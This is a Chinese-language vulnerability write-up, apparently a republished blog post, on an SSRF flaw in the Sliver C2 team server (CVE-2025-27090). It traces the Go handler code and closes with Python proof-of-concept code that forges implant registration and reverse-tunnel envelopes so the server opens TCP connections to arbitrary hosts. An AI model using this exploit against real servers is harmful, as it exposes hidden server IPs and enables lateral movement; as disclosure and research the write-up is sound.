#  Sliver C2 SSRF 漏洞分析   
 独眼情报   2025-02-20 07:23  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSf3LicQYxrhZp9SibwWuEIS5TxSqdk787vPKqo10UIDJel1lH3I0wLLiacxQxQibbHoK3iaNXhJlfJa1w/640?wx_fmt=png&from=appmsg "")  
## 摘要  
  
Sliver C2  
 是一个开源的跨平台对抗模拟/红队框架,被红队和威胁行为者广泛使用。在审计代码过程中,我发现了一个漏洞:攻击者可以在团队服务器上打开一个指向任意 IP/端口的 TCP 连接,并通过该 socket 读写流量(这是一种强大的 SSRF 形式)。利用这个漏洞可能导致:  
- 泄露位于重定向器后面的团队服务器 IP  
  
- 从团队服务器横向移动到其他服务  
  
## 受影响的服务器  
  
版本(基本上是 2022 年 9 月以来安装的服务器):  
- v1.5.26 到 v1.5.42  
  
- v1.6.0 < 0f340a2  
  
攻击者需要满足: 访问 C2 端口(如: mtls --lport 8443  
)  
  
且满足以下之一:  
  
a) 访问staging监听器端口,该端口提供非加密的 shellcode(如: stage-listener --url tcp://0.0.0.0:443 --profile win-shellcode  
)  
  
b) 访问 stager/生成的植入二进制文件(来自 staging 目录、目标环境中的投递,或从 staging 监听器提供)  
  
你可以在**这里**  
(https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w  
)找到该问题的公告,在这里(https://github.com/BishopFox/sliver/releases/tag/v1.5.43  
)找到修复版本。  
## 理解植入回连处理流程  
  
Sliver 支持多种传输类型的监听器,如 mTLS、HTTP(S)和 DNS。当操作员启动监听器时,团队服务器会打开一个由协议特定后端代码处理的端口。这些端口可能直接在团队服务器上访问,也可能通过重定向器路由,如下图所示。团队服务器可以位于云端的 VPS 上,也可以在本地。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSf3LicQYxrhZp9SibwWuEIS5xyDJEwbYwqBM9eA2FmH2AkOhvlTSNSXqrdjwMsnkMWSj8VoUNWUdQA/640?wx_fmt=png&from=appmsg "")  
  
每种监听器类型都有单独的代码库来处理不同协议类型的流量。尽管每种监听器类型由于处理不同协议而代码不同,但它们都会将植入流量处理成结构化格式(一个Envelope  
)并将执行传递给协议通用处理程序。  
  
让我们开始从 mTLS 监听器的代码追踪到漏洞点。  
  
这个函数通过 net.Conn  
 对象处理植入到团队服务器以及团队服务器到植入的流量。在 [1]  
 处我们看到启动了一个负责处理植入到团队服务器流量的 Goroutine。在 [2]  
 处,我们看到从植入连接中读取一个信封。在 [3]  
 处检查 envelope.Type  
 是否存在于 serverHandlers.GetHandlers()  
 返回的 handlers  
 映射中。当找到信封的匹配处理程序时,它将在 [4]  
 处使用植入连接对象和 envelope.Data  
 调用相关函数。  
```
// server/c2/mtls.gofunc handleSliverConnection(conn net.Conn) {    mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())    implantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())    deferfunc() {        mtlsLog.Debugf("mtls connection closing")        conn.Close()        implantConn.Cleanup()    }()    done := make(chanbool)    gofunc() { // [1]        deferfunc() {            done <- true        }()        handlers := serverHandlers.GetHandlers()        for {            envelope, err := socketReadEnvelope(conn) // [2]            if err != nil {                mtlsLog.Errorf("Socket read error %v", err)                return            }            implantConn.UpdateLastMessage()            if envelope.ID != 0 {                implantConn.RespMutex.RLock()                if resp, ok := implantConn.Resp[envelope.ID]; ok {                    resp <- envelope // 可能会死锁,也许需要研究更好的解决方案                }                implantConn.RespMutex.RUnlock()            } elseif handler, ok := handlers[envelope.Type]; ok { // [3]                mtlsLog.Debugf("Received new mtls message type %d, data: %s", envelope.Type, envelope.Data)                gofunc() {                    respEnvelope := handler(implantConn, envelope.Data) // [4]                    if respEnvelope != nil {                        implantConn.Send <- respEnvelope                    }                }()            }        }    }()...
```  
  
通过伪造植入流量,我们可以到达代码的这个点,并通过设置 envelope.Type  
 变量来调用从 serverHandlers.GetHandlers()  
 返回的任何函数。我们还可以控制传递给所选函数的参数(implantConn  
, envelope.Data  
)。  
  
让我们看看我们可以调用哪些函数,参考 serverHandlers.GetHandlers()  
 的代码。要利用这个漏洞,我们需要:  
- 通过调用 [1]  
 处的 registerSessionHandler  
 函数注册会话  
  
- 通过调用 [2]  
 处的 tunnelDataHandler  
 函数打开反向隧道  
  
```
// server/handlers/handlers.go// GetHandlers - 返回服务器端消息处理程序的映射func GetHandlers() map[uint32]ServerHandler {    returnmap[uint32]ServerHandler{        // Sessions        sliverpb.MsgRegister:    registerSessionHandler, // [1]        sliverpb.MsgTunnelData:  tunnelDataHandler,  // [2]        sliverpb.MsgTunnelClose: tunnelCloseHandler,        sliverpb.MsgPing:        pingHandler,        sliverpb.MsgSocksData:   socksDataHandler,        // Beacons        sliverpb.MsgBeaconRegister: beaconRegisterHandler,        sliverpb.MsgBeaconTasks:    beaconTasksHandler,        // Pivots        sliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,        sliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,    }}
```  
  
让我们看看 registerSessionHandler  
 函数。  
  
在 [1]  
 处,调用 core.NewSession  
 函数生成与我们的植入连接相关联的会话对象。在 [2]  
 处,这个对象被添加到团队服务器已知会话的列表中。这个列表稍后会被检查以确保我们的连接有一个关联的会话,确保在做任何其他事情之前已经完成注册。  
```
// server/handlers/sessions.gofunc registerSessionHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {    if implantConn == nil {        returnnil    }    register := &sliverpb.Register{}    err := proto.Unmarshal(data, register)    if err != nil {        sessionHandlerLog.Errorf("Error decoding session registration message: %s", err)        returnnil    }    session := core.NewSession(implantConn) // [1]    // 解析注册 UUID    sessionUUID, err := uuid.Parse(register.Uuid)    if err != nil {        sessionUUID = uuid.New() // 生成随机 UUID    }    session.Name = register.Name     session.Hostname = register.Hostname    session.UUID = sessionUUID.String()    session.Username = register.Username    session.UID = register.Uid    ...    core.Sessions.Add(session) // [2]    implantConn.Cleanup = func() {        core.Sessions.Remove(session.ID)    }    go auditLogSession(session, register)    returnnil}
```  
  
让我们看看第二个需要调用的函数 tunnelDataHandler  
。在 [1]  
 处我们看到前面提到的注册检查,如果我们的连接还没有关联会话对象,这将阻止我们。再往下在 [2]  
 处,我们看到一个名为 createReverseTunnelHandler  
 的函数,从实现 SSRF 的角度来看这听起来很有趣。在 [3]  
 处,我们可以看到命中这个分支的条件是 rtunnel  
 变量需要为 nil  
,这可以通过发送无效的 TunnelID  
 来实现(见 [4]  
),并且 tunnelData.CreateReverse  
 设置为 true。这应该很简单,只需在我们的植入请求中将此字段设置为 true。implantConn  
 和 data  
 都传递给了 createReverseTunnelDataHandler  
,这两个参数都在我们的控制之下。  
```
// server/handlers/session.gofunc tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {    session := core.Sessions.FromImplantConnection(implantConn) // [1]    if session == nil {        sessionHandlerLog.Warnf("Received tunnel data from unknown session: %v", implantConn)        returnnil    }    tunnelHandlerMutex.Lock()    defer tunnelHandlerMutex.Unlock()    tunnelData := &sliverpb.TunnelData{}    proto.Unmarshal(data, tunnelData)    sessionHandlerLog.Debugf("[DATA] Sequence on tunnel %d, %d, data: %s", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)    rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID) // [4]    if rtunnel != nil && session.ID == rtunnel.SessionID {        RTunnelDataHandler(tunnelData, rtunnel, implantConn)    } elseif rtunnel != nil && session.ID != rtunnel.SessionID {        sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on reverse tunnel it did not own", session.ID)    } elseif rtunnel == nil && tunnelData.CreateReverse == true { // [3]        createReverseTunnelHandler(implantConn, data) // [2]        //RTunnelDataHandler(tunnelData, rtunnel, implantConn)    } else {        tunnel := core.Tunnels.Get(tunnelData.TunnelID)        if tunnel != nil {            if session.ID == tunnel.SessionID {                tunnel.SendDataFromImplant(tunnelData)            } else {                sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)            }        } else {            sessionHandlerLog.Warnf("Data sent on nil tunnel %d", tunnelData.TunnelID)        }    }    returnnil}
```  
  
在 [1]  
 处我们看到我们的植入数据被反序列化为一个 TunnelData  
 结构体,然后 Host  
 字段和 Port  
 字段在 [2]  
 处以 IP:PORT  
 的格式传递给 Sprintf  
 调用。在 [3]  
 处我们看到这个字符串被传递给 DialContext  
 调用。此时,我们已经成功让团队服务器打开了一个指向任意地址的 TCP 连接,这足以泄露位于重定向器后面的 C2 服务器 IP。但是,我们需要看看如何从连接中读写数据来实现完整的 SSRF。  
  
在 [4]  
 处,我们看到调用 NewRTunnel  
,传入 dst  
(我们的 TCP 连接)来返回一个 tunnel  
 结构体。tunnel.Writer  
 字段将包含 dst  
 对象。在 [5]  
 处,我们看到调用 tunnel.Writer.Write(...)  
将植入发送的数据(recv.Data)写入 TCP 连接。  
```
// server/handlers/sessions.gofunc createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {    session := core.Sessions.FromImplantConnection(implantConn)    req := &sliverpb.TunnelData{}    proto.Unmarshal(data, req)  // [1]    var defaultDialer = new(net.Dialer)    remoteAddress := fmt.Sprintf("%s:%d", req.Rportfwd.Host, req.Rportfwd.Port) // [2]    ctx, cancelContext := context.WithCancel(context.Background())    dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress) // [3]    //dst, err := net.Dial("tcp", remoteAddress)    if err != nil {        tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{            Closed:   true,            TunnelID: req.TunnelID,        })        implantConn.Send <- &sliverpb.Envelope{            Type: sliverpb.MsgTunnelClose,            Data: tunnelClose,        }        cancelContext()        returnnil    }    if conn, ok := dst.(*net.TCPConn); ok {        // {{if .Config.Debug}}        //log.Printf("[portfwd] Configuring keep alive")        // {{end}}        conn.SetKeepAlive(true)        // TODO: 使 KeepAlive 可配置        conn.SetKeepAlivePeriod(1000 * time.Second)    }    tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst) // [4]    rtunnels.AddRTunnel(tunnel)    cleanup := func(reason error) {        // {{if .Config.Debug}}        sessionHandlerLog.Infof("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)        // {{end}}        tunnel := rtunnels.GetRTunnel(tunnel.ID)        rtunnels.RemoveRTunnel(tunnel.ID)        dst.Close()        cancelContext()    }    gofunc() {        tWriter := tunnelWriter{            tun:  tunnel,            conn: implantConn,        }        // portfwd 只使用一个读取器,因此是 tunnel.Readers[0]        n, err := io.Copy(tWriter, tunnel.Readers[0]) // [1]        _ = n // 如果禁用调试模式,避免编译器报未使用错误        // {{if .Config.Debug}}        sessionHandlerLog.Infof("[tunnel] Tunnel done, wrote %v bytes", n)        // {{end}}        cleanup(err)    }()    tunnelDataCache.Add(tunnel.ID, req.Sequence, req)    // 注意:读/写语义可能有点令人费解,只需记住我们从服务器读取并写入隧道的读取器(如stdout),    // 所以这里使用 ReadSequence,而写回服务器的数据使用 WriteSequence    // 遍历缓存并将所有顺序数据写入读取器    for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {        // {{if .Config.Debug}}        //sessionHandlerLog.Infof("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)        // {{end}}        tunnel.Writer.Write(recv.Data) // [5]        // 从缓存中删除我们刚写入的条目        tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())        tunnel.IncReadSequence() // 增加序列计数器        // {{if .Config.Debug}}        //sessionHandlerLog.Infof("[message just received] %v", tunnelData)        // {{end}}    }
```  
  
让我们看看如何从 TCP 连接中读取数据。回到 handleSliverConnection  
(回忆一下,这个函数处理植入到团队服务器以及团队服务器到植入的流量),我们看到在函数底部启动了一个循环,它将等待服务器尝试向我们的植入发送数据,之后它将调用 socketWriteEnvelope  
 函数。  
```
// server/c2/mtls.goLoop:    for {        select {        case envelope := <-implantConn.Send:            err := socketWriteEnvelope(conn, envelope)            if err != nil {                mtlsLog.Errorf("Socket write failed %v", err)                break Loop            }        case <-done:            break Loop        }    }
```  
  
socketWriteEnvelope  
 将解构 envelope  
 对象并通过网络连接发送。在编写漏洞利用时,我们只需要在利用 SSRF 后从套接字读取数据。  
```
// server/c2/mtls.go// socketWriteEnvelope - 使用长度前缀帧写入消息到 TLS 套接字// 这是一种花哨的说法,意思是我们写入消息的长度然后写入消息// 例如 [uint32 length|message] 这样接收者可以正确分隔消息func socketWriteEnvelope(connection net.Conn, envelope *sliverpb.Envelope) error {    data, err := proto.Marshal(envelope)    if err != nil {        mtlsLog.Errorf("Envelope marshaling error: %v", err)        return err    }    dataLengthBuf := new(bytes.Buffer)    binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))    connection.Write(dataLengthBuf.Bytes())    connection.Write(data)    returnnil}
```  
  
但是为了将数据写回植入(在调用 socketWriteEnvelope  
 中发生),团队服务器需要从 TCP 连接读取响应数据。这在 createReverseTunnelHandler  
 函数的一个 goroutine 中发生。goroutine 将在 [1]  
 处的 io.Copy  
 调用上阻塞,等待 tunnel.Readers[0]  
 被写入(TCP 连接上的响应)并将其复制到 tWriter  
。tWriter  
 对象是 Writer  
 接口的一个实现,需要实现一个在发生 io.Copy  
 时调用的 Write  
 方法。  
```
// server/handlers/sessions.go    gofunc() {        tWriter := tunnelWriter{            tun:  tunnel,            conn: implantConn,        }        // portfwd 只使用一个读取器,因此是 tunnel.Readers[0]        n, err := io.Copy(tWriter, tunnel.Readers[0]) // [1]        _ = n // 如果禁用调试模式,避免编译器报未使用错误        // {{if .Config.Debug}}        sessionHandlerLog.Infof("[tunnel] Tunnel done, wrote %v bytes", n)        // {{end}}        cleanup(err)    }()
```  
  
tunnelWriter  
 类型的 Write  
 方法如下所示。data  
(TCP 响应)被放入一个 TunnelData  
 protobuf 中,并在 [1]  
 处通过 tw.conn.Send <- data  
 作为信封发送到植入连接。回想一下,在 handleSliverConnection  
 的 Loop  
 中,它将在通道上等待发送信封(envelope := <-implantConn.Send  
),之后,它将通过植入连接将信封发回植入。这就是我们如何获取 TCP 连接的响应。  
```
func (tw tunnelWriter) Write(data []byte) (int, error) {    n := len(data)    data, err := proto.Marshal(&sliverpb.TunnelData{        Sequence: tw.tun.WriteSequence(), // 隧道写入序列        Ack:      tw.tun.ReadSequence(),        TunnelID: tw.tun.ID,        Data:     data,    })    // {{if .Config.Debug}}    log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, tw.tun.WriteSequence(), tw.tun.ReadSequence())    // {{end}}    tw.tun.IncWriteSequence() // 增加写入序列    tw.conn.Send <- &sliverpb.Envelope{ // [1]        Type: sliverpb.MsgTunnelData,        Data: data,    }    return n, err}
```  
  
现在我们已经确定了实现完全读取 SSRF 所需的所有代码库部分。让我们看看是否可以为它制作一个概念验证。  
## 编写漏洞利用  
  
虽然这个漏洞可以通过不同的协议处理程序类型来利用,但我们将重点放在 mTLS 上。为了建立 mTLS 连接,我们需要客户端证书/密钥,这些可以从 staging/shellcode 监听器(stage-listener  
)或生成的二进制文件/加载器获得。  
  
@AceResponder  
 的   
RogueSliver  
 项目展示了如何从 sliver 植入中提取这些客户端证书/密钥。它还提供了如何使用 sliver 的 protobufs 的示例,所以我将其作为代码的起点。  
  
以下是利用此漏洞的高级步骤。在 [1]  
 处我们建立与团队服务器 mTLS 监听器的连接。下一步是注册,如 [2]  
 所示,包括调用 generate_registration_envelope  
 并将此信封及其长度写入套接字。在 [3]  
 处执行类似的操作来创建反向隧道,生成信封并将其写入套接字。在 [4]  
 处我们将从套接字读取以获取响应。  
```
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    with ssl_ctx.wrap_socket(s,) as ssock:        ssock.connect((ip, port)) # [1]        ssock.settimeout(0.5)        print("[***] 注册会话")        registration_envelope = generate_registration_envelope().SerializeToString() # [2]        registration_envelope_len = struct.pack('I', len(registration_envelope))        ssock.write(registration_envelope_len + registration_envelope) # [2]        time.sleep(0.5)        print("[***] 创建隧道")        reverse_tunnel_envelope = generate_create_reverse_tunnel_envelope(callback_ip, callback_port, data).SerializeToString() # [3]        reverse_tunnel_envelope_len = struct.pack('I', len(reverse_tunnel_envelope))        ssock.write(reverse_tunnel_envelope_len + reverse_tunnel_envelope) # [3]        print("[***] 已发送数据\n" + data.decode().rstrip())        print("[***] 从连接读取")        for i in range(4): # [4]            try:                print(ssock.read().decode(errors='ignore')) # [4]            except: continue
```  
  
让我们看看 generate_registration_envelope  
 和 generate_create_reverse_tunnel_envelope  
 函数。对于这两个函数,我们从一个字典开始,该字典将被格式化并序列化为一个 Envelope  
 protobuf。注册字典的内容并不重要,但为了利用漏洞,我们需要设置一些隧道字典字段。  
  
我们可以在 [1]  
 处看到我们将 CreateReverse  
 设置为 True  
,这样我们就可以命中 tunnelDataHandler  
 中允许我们创建新反向隧道的分支。在 [2]  
 处我们设置我们想让团队服务器打开隧道的 IP 和端口,在 [3]  
 处我们指定团队服务器将通过隧道发送的 base64 数据。  
```
def generate_registration_envelope():    random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))    register_data = {            "Name": random_string,            "Hostname": "chebuya-" + random_string + ".local",            "Uuid": "uuid"+ random_string,            "Username": "username"+ random_string,            "Uid": "uid"+ random_string,            "Gid": "gid"+ random_string,            "Os": "os"+ random_string,            "Arch": "arch"+ random_string,            "Pid": 1337,            "Filename": "filename"+ random_string,            "ActiveC2": "activec2"+ random_string,            "Version": "version"+ random_string,            "ReconnectInterval": 1337,            "ConfigID": "config_id"+ random_string,            "PeerID": -1337,            "Locale": "locale" + random_string            }    register = sliver.Register()    json_format.Parse(json.dumps(register_data), register)    envelope = sliver.Envelope()    envelope.Type = msgs.index('Register')    envelope.Data = register.SerializeToString()    return envelopedef generate_create_reverse_tunnel_envelope(ip, port, data):    tunnel_data = {            "Data": base64.b64encode(data).decode(), # [3]            "Closed": False,            "Sequence": 0,            "Ack": 0,            "Resend": False,            "CreateReverse": True, # [1]            "rportfwd": {                "Port": port, # [2]                "Host": ip, # [2]                "TunnelID": 1,                },            "TunnelID": 1,            }    tunnel = sliver.TunnelData()    json_format.Parse(json.dumps(tunnel_data), tunnel)    envelope = sliver.Envelope()    envelope.Type = msgs.index('TunnelData')    envelope.Data = tunnel.SerializeToString()    return envelope
```  
  
这完成了漏洞利用的大部分重要部分,你可以在**这里**  
(https://github.com/chebuya/exploits/tree/main/CVE-2025-27090%3A%20Sliver%20C2%20SSRF  
)找到完整版本。  
  
  
